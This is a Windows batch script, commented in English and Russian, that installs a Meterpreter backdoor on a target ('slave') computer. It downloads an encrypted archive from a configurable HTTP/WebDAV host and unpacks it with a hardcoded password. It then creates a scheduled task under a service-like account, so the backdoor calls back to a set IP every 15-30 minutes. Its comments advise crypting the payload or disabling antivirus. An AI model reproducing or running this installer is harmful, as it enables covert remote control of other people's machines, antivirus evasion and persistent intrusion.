@echo off
rem install_meterpreter.bat (HTTP Version)
rem This Script checks if Meterpreter Backdopr Installation file is exist
rem and installs this backdoor on a slave computer
rem Backdoor is start every 15-30 min and sets connection
rem to the specified IP Address
rem Note! The meterpreter backdoor must be encrypted with the cryptor program
rem Or antivirus must be hard locked off!

rem Script for Downloads and Installs Meterpreter Backdoor
rem USAGE
rem > install_meterpreter.bat
rem Run script with administrative privileges

rem Initialising Script's Environment

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%

rem Refresh Environment Variables
call "C:\ProgramData\chocolatey\bin\RefreshEnv.cmd"

rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\install_Styler.ini || exit /b 1

rem HTTP WebDAV Host
set host=%httppref%://%httphost%:%httpport%/%httpMainFolder%
rem Локальный каталог
set LocalFolderZ=%PUB1%\Distrib\Zlovred
set LocalFolderU=%PUB1%\Util

echo "Download Backdoor..."

rem Change Current Catalog
cd /d %LocalFolderZ%

rem Download the Backdoor
wget %host%/meterpreter-backdoor.7z

rem Install Meterpreter Backdoor
if not exist meterpreter-backdoor.7z goto pass_Meterpreter
echo "Install Meterpreter Backdoor..."
7z e -bd -o%LocalFolderU% -pAdmin01234 meterpreter-backdoor.7z

cd /d %LocalFolderU%

echo "Scheduled Task..."

%SystemRoot%\System32\schtasks.exe /Create /XML %LocalFolderU%\User_Quartre_Task1.xml /TN "User Quartre Task1" /F /RU MSSQLSR /RP Admin01234

:pass_Meterpreter
exit /b 0


rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

